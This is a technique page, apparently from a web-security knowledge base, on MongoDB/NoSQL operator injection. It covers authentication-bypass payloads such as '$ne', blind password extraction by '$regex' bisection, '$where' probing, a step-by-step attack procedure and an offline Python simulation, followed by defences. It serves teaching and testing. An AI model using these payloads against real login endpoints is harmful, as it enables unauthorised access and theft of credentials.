---
title: "NoSQL Injection - MongoDB Operator Injection"
category: web
subcategory: nosqli
type: technique
tags: [nosqli, nosql-injection, mongodb, mongoose, operator-injection, ne-operator, gt-operator, regex-operator, where-operator, exists-operator, qs-parsing, express, bson, javascript-execution, aggregation, express-mongo-sanitize, nosqlmap, burp]
difficulty: medium
summary: "A query is a document, so injecting a nested object changes the query's operators - the bug is a type confusion, not a string-escaping failure."
when_to_use:
  - "A login or search endpoint builds a MongoDB query from request fields"
  - "The app is Express/Mongoose and parses query strings or JSON bodies into the filter"
  - "You can send a nested object where the code expects a string"
  - "You need to explain why escaping quotes does nothing against this class"
tools: [burp, nosqlmap, mongosh]
related: [sqli-blind-boolean, proto-pollution, graphql-attacks]
---

## TL;DR

MongoDB queries are BSON documents, not strings. There is no quote to escape and no statement to terminate.
The vulnerability appears when user input that the developer assumed was a **string** arrives as an
**object**, because an object in a field position is interpreted as a set of query operators. `{"$ne": null}`
in place of `"hunter2"` turns "password equals this" into "password is not null". Everything else on this
page follows from that one substitution.

## Recognise it

- A login handler of the shape `User.findOne({ user: req.body.user, pass: req.body.pass })` with no type check.
- The endpoint accepts `application/json`, or it is Express with the default extended query parser.
- Sending `user[$ne]=x` in a urlencoded body changes behaviour versus `user=x`.
- Error text mentioning `MongoError`, `CastError`, `BSONTypeError`, `$where`, or a Mongoose validation message.
- The response differs between a nested object and a plain string for the same field, even when both are
  "wrong" credentials.
- `_id` values that look like `507f1f77bcf86cd799439011` (24 hex characters - a BSON ObjectId).

## Theory

### The query is a data structure

A find filter is a document. Each key is a field name; each value is either a literal to match or a
**document of operators**:

```js
{ user: "alice" }                  // equality
{ user: { $ne: null } }            // not-equal operator
{ age:  { $gt: 18, $lt: 65 } }     // two operators on one field
```

The database cannot distinguish "the developer wrote this operator" from "the operator arrived from the
request". There is no injection point in the textual sense, because the filter was never text. This is why
quote-escaping, prepared-statement thinking and SQL intuition all transfer badly: the exploit is a **type
confusion**, and the fix is a type check.

### How an object arrives where a string was expected

Two independent routes, and mixing them up wastes a lot of time:

**JSON bodies.** Trivial - JSON has objects natively:

```json
{"user": "admin", "pass": {"$ne": null}}
```

**Urlencoded bodies and query strings.** Express uses the `qs` library by default (`extended: true`), which
parses bracket notation into nested structures:

```
user=admin&pass[$ne]=              ->  { user: "admin", pass: { $ne: "" } }
user=admin&pass[$regex]=^a         ->  { user: "admin", pass: { $regex: "^a" } }
```

The bracket syntax is a `qs` feature, not a MongoDB one. Frameworks that use a strict urlencoded parser
(`extended: false`, most non-Node stacks) produce a flat string map, and this route is simply unavailable -
which is why the same payload works on one stack and does nothing on another. Check which parser is in play
before concluding the endpoint is not vulnerable.

### The operators that matter, and what each is for

| Operator | Effect | Typical use |
|----------|--------|-------------|
| `$ne` | not equal | authentication bypass - `{$ne: null}` matches any document with the field |
| `$gt` / `$gte` / `$lt` | comparison | works on strings too, so it orders lexicographically |
| `$in` | membership | try a list of candidates in one request |
| `$exists` | field presence | distinguish "no such user" from "wrong password" |
| `$regex` | pattern match | the extraction primitive - see below |
| `$where` | run JavaScript | full expression evaluation, when enabled |
| `$nin` | not in list | negation of `$in` |

`$ne` on the password field is the canonical login bypass because `findOne` returns the *first* matching
document and the application then treats it as the authenticated user.

### Blind extraction via $regex

`$regex` turns the login endpoint into a boolean oracle: the query either matches a document or it does not,
and the response differs. That is exactly the structure of a blind SQL injection, so the same
character-at-a-time walk applies:

```
pass[$regex]=^a       -> no match
pass[$regex]=^b       -> no match
...
pass[$regex]=^h       -> match     (first character is 'h')
pass[$regex]=^ha      -> ...
```

Each position costs one request per candidate character, so a naive walk is `len(charset) * len(secret)`
requests. Two refinements are worth knowing because they are the difference between practical and not:

- **Anchor both ends** once you think you are done (`^hunter2$`) to confirm the length rather than inferring it.
- **Bisect the character space** with a character class (`^[a-m]`) instead of testing one character at a
  time, turning the per-position cost from `O(n)` to `O(log n)`. This is the same optimisation as the binary
  search in `scripts/web/blind-sqli-exfil`.

Note that `$regex` against a *hashed* password field extracts the hash, not the password - which is often
still the objective, but it is worth knowing which one you are getting.

### The JavaScript execution surface

Three places MongoDB will evaluate JavaScript server-side:

- **`$where`** - a predicate evaluated per document. `{"$where": "this.user == 'admin'"}`. Slow, cannot use
  indexes, and **disabled by default** since MongoDB 4.4 unless `security.javascriptEnabled` is on. It also
  does not exist on Atlas' shared tiers.
- **`mapReduce`** - deprecated in 5.0, removed from the default surface in later versions.
- **`$function` and `$accumulator`** in the aggregation pipeline - the modern equivalent, added in 4.4, also
  requiring server-side JavaScript to be enabled.

The important calibration: on a current, default-configured MongoDB, none of these are available. Finding
`$where` reachable tells you the deployment has explicitly enabled server-side JavaScript, which is a
configuration finding in its own right. In a CTF it is frequently enabled because the challenge wants it to
be. Treat "is JavaScript enabled" as a fact to establish, not an assumption.

When it *is* enabled, the evaluation happens in a restricted interpreter scoped to the document, so it is
expression evaluation over the collection rather than a shell on the host. Its practical value is as a much
richer oracle than `$regex` - arbitrary predicates over `this` - and as a denial-of-service primitive
(an infinite loop in a per-document predicate).

### Where else operators reach

Operator injection is not limited to find filters. Update documents (`$set`, `$inc`, `$rename`), aggregation
stages, and sort/projection specifications are all documents built the same way. An unvalidated object
reaching an update is a mass-assignment problem: `{"$set": {"role": "admin"}}` if the update body is spread
into the update document. The mechanism is identical; only the sink differs.

## Attack

1. **Establish the body format.** JSON or urlencoded? If urlencoded, does bracket notation nest? Send
   `x[y]=1` and look for any behavioural difference.
2. **Confirm type confusion.** Compare `field=value` with `field[$ne]=value` on a field you know the correct
   value of. A difference proves the object reached the query.
3. **Get a reliable oracle.** Two inputs, one that matches and one that does not, with a stable observable
   difference (status, length, redirect, timing).
4. **Decide what you are extracting.** `$exists` to map which fields exist, `$regex` to walk a value.
5. **Bisect, do not enumerate.** Character-class regexes cut the request count by an order of magnitude.
6. **Check the JavaScript surface separately** - a `$where` probe that errors distinguishes "disabled" from
   "not vulnerable".

## Code

An offline model of the mechanism: a `qs`-style bracket parser, a miniature document matcher implementing the
operator semantics, and the type-check that closes it. Running it shows the bypass happening at the level of
data structures, with no database and no network.

```python
#!/usr/bin/env python3
"""Model MongoDB operator injection as the type confusion it is.

Three parts:
  1. qs-style bracket parsing, which is how an object reaches a urlencoded field.
  2. A miniature matcher implementing $ne/$gt/$regex/$in/$exists semantics.
  3. The validator that closes it, and a demonstration that it does.

No database, no network.
"""
from __future__ import annotations

import re
from typing import Any
from urllib.parse import parse_qsl

Document = dict[str, Any]

BRACKET = re.compile(r"^([^\[\]]+)((?:\[[^\[\]]*\])*)$")


def qs_parse(query: str) -> Document:
    """Parse bracket notation into nested dicts, the way Express' `qs` does.

    `pass[$ne]=` becomes {"pass": {"$ne": ""}}. A strict parser would instead
    produce the flat key "pass[$ne]", and the whole technique would not apply.
    """
    out: Document = {}
    for key, value in parse_qsl(query, keep_blank_values=True):
        match = BRACKET.match(key)
        if not match:
            out[key] = value
            continue
        root, rest = match.group(1), match.group(2)
        parts = [root] + re.findall(r"\[([^\[\]]*)\]", rest)
        cursor = out
        for part in parts[:-1]:
            nxt = cursor.get(part)
            if not isinstance(nxt, dict):
                nxt = {}
                cursor[part] = nxt
            cursor = nxt
        cursor[parts[-1]] = value
    return out


def qs_parse_strict(query: str) -> dict[str, str]:
    """A strict urlencoded parser: every value is a string, brackets are literal."""
    return dict(parse_qsl(query, keep_blank_values=True))


def match_field(value: Any, condition: Any) -> bool:
    """Apply one field condition: a literal is equality, a dict is operators."""
    if not isinstance(condition, dict):
        return bool(value == condition)
    for op, operand in condition.items():
        if op == "$ne":
            if value == operand:
                return False
        elif op == "$eq":
            if value != operand:
                return False
        elif op == "$gt":
            if not (value is not None and value > operand):
                return False
        elif op == "$lt":
            if not (value is not None and value < operand):
                return False
        elif op == "$in":
            if value not in operand:
                return False
        elif op == "$nin":
            if value in operand:
                return False
        elif op == "$exists":
            wants = operand not in (False, "false", "", "0")
            if (value is not None) != wants:
                return False
        elif op == "$regex":
            if value is None or not re.search(operand, str(value)):
                return False
        else:
            raise ValueError(f"unsupported operator {op!r}")
    return True


def find_one(collection: list[Document], query: Document) -> Document | None:
    """Return the first document matching every field condition."""
    for doc in collection:
        if all(match_field(doc.get(field), cond) for field, cond in query.items()):
            return doc
    return None


def has_operator(value: Any) -> bool:
    """True if any key anywhere in the structure begins with '$'."""
    if isinstance(value, dict):
        return any(str(k).startswith("$") or has_operator(v) for k, v in value.items())
    if isinstance(value, list):
        return any(has_operator(v) for v in value)
    return False


def coerce_strings(query: Document) -> Document:
    """The real fix: the field was declared a string, so require a string."""
    return {k: (v if isinstance(v, str) else str(v)) for k, v in query.items()}


USERS: list[Document] = [
    {"user": "admin", "pass": "s3cr3t-admin-pw", "role": "admin"},
    {"user": "alice", "pass": "hunter2", "role": "user"},
]


def login(body: Document, *, validate: bool) -> Document | None:
    """The vulnerable handler, with the validator switchable for comparison."""
    if validate:
        if has_operator(body):
            return None                      # reject outright
        body = coerce_strings(body)          # and enforce the declared type
    return find_one(USERS, {"user": body.get("user"), "pass": body.get("pass")})


if __name__ == "__main__":
    print("== 1. how an object reaches a string field ==")
    raw = "user=admin&pass[$ne]="
    loose, strict = qs_parse(raw), qs_parse_strict(raw)
    print(f"  qs (Express default) {raw!r}\n    -> {loose}")
    print(f"  strict parser        {raw!r}\n    -> {strict}")
    assert loose["pass"] == {"$ne": ""}, "bracket notation nests into an object"
    assert strict["pass[$ne]"] == "", "a strict parser keeps it a flat string key"
    assert "pass" not in strict, "so the operator never reaches the query"

    print("\n== 2. the operator changes the query's meaning ==")
    assert login({"user": "admin", "pass": "wrong"}, validate=False) is None
    bypassed = login(qs_parse(raw), validate=False)
    print(f"  {{'pass': {{'$ne': ''}}}} -> {bypassed['user'] if bypassed else None!r}")
    assert bypassed is not None and bypassed["user"] == "admin", "not-equal matches any password"
    # JSON reaches the same place by a different route.
    assert login({"user": "admin", "pass": {"$ne": None}}, validate=False)["role"] == "admin"
    # $gt works because strings compare lexicographically.
    assert login({"user": "admin", "pass": {"$gt": ""}}, validate=False) is not None

    print("\n== 3. $regex is a boolean oracle: recover a value one class at a time ==")
    def oracle(pattern: str) -> bool:
        return login({"user": "alice", "pass": {"$regex": pattern}}, validate=False) is not None

    assert oracle("^h") and not oracle("^z"), "the oracle distinguishes prefixes"

    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    recovered, requests = "", 0
    while len(recovered) < 7:
        lo, hi = 0, len(charset)
        while hi - lo > 1:                      # bisect the character space
            mid = (lo + hi) // 2
            window = re.escape(charset[lo:mid])
            requests += 1
            if oracle("^" + re.escape(recovered) + "[" + window + "]"):
                hi = mid
            else:
                lo = mid
        recovered += charset[lo]
    requests += 1
    assert oracle("^" + re.escape(recovered) + "$"), "anchor both ends to confirm the length"
    print(f"  recovered {recovered!r} in {requests} oracle calls "
          f"(vs ~{len(charset) * len(recovered)} for a linear walk)")
    assert recovered == "hunter2"

    print("\n== 4. the validator closes every route above ==")
    for attempt in (qs_parse(raw),
                    {"user": "admin", "pass": {"$ne": None}},
                    {"user": "admin", "pass": {"$gt": ""}},
                    {"user": "alice", "pass": {"$regex": "^h"}}):
        assert login(attempt, validate=True) is None, f"should be rejected: {attempt}"
    # Genuine credentials still work - the check rejects objects, not users.
    assert login({"user": "alice", "pass": "hunter2"}, validate=True)["role"] == "user"
    print("  operator documents rejected; real logins unaffected")

    print("\nself-test ok")
```

## Variants & pitfalls

- **Bracket nesting depends on the parser.** `qs` with `extended: true` nests; a strict parser does not.
  A failed payload may mean the wrong body format rather than a fixed endpoint - retry as JSON.
- **`$ne: null` versus `$ne: ""`.** They differ when the field is absent or empty. Try both.
- **`$regex` metacharacters in the value** you are recovering will confuse the walk; escape the known prefix
  each time, as the code above does.
- **Regex is anchored only if you anchor it.** `$regex: "a"` matches anywhere, which breaks a prefix walk.
- **Extracting a hash, not a password.** If the field is hashed, `$regex` recovers the hash.
- **`$where` is off by default** on modern servers. Its absence is not evidence the endpoint is safe.
- **Mongoose casts.** A schema-typed `String` field makes Mongoose reject an object with a `CastError`,
  which closes the simple cases. `strictQuery` and the use of `lean()`/raw driver calls change this, so the
  presence of Mongoose is not by itself a defence.
- **Operators in update documents** are mass assignment, a separate sink with the same root cause.
- **Rate limiting ruins a character walk.** Bisecting the character space matters more than it looks.

### Defence / what closes this

Validate types before building the query: if the field is declared a string, require `typeof x === "string"`
and reject anything else. That single check ends the whole class, because the vulnerability is an object
arriving where a string belonged. Use a schema validator (Mongoose schema types, Zod, Joi, `ajv`) at the
boundary rather than trusting the parsed body. Reject request keys beginning with `$` or containing `.`, or
use a maintained sanitiser such as `express-mongo-sanitize`, as defence in depth - but keep the type check as
the primary control, since key-stripping is a blacklist. Leave server-side JavaScript disabled
(`security.javascriptEnabled: false`), which is the default, and never construct `$where` from user input.
For authentication specifically, look the user up by username, then verify the password with a constant-time
hash comparison in application code - so the password value never appears in a query filter at all.

## Tools

- Burp Repeater - switching a field between a string and an object is a one-line edit.
- `nosqlmap` - automates the operator probes; read what it sends rather than just reading its verdict.
- `mongosh` against a local container - the fastest way to check whether an operator behaves as you expect.
- `express-mongo-sanitize` - reading its source is a short lesson in what key-stripping can and cannot do.

## References

- OWASP Testing Guide, testing for NoSQL injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- PortSwigger, NoSQL injection: https://portswigger.net/web-security/nosql-injection
- MongoDB manual, query operators: https://www.mongodb.com/docs/manual/reference/operator/query/
- MongoDB manual, `$where`: https://www.mongodb.com/docs/manual/reference/operator/query/where/
- MongoDB manual, server-side JavaScript: https://www.mongodb.com/docs/manual/core/server-side-javascript/
- PayloadsAllTheThings, NoSQL injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- `qs` (Express query parser): https://github.com/ljharb/qs
- `express-mongo-sanitize`: https://github.com/fiznool/express-mongo-sanitize
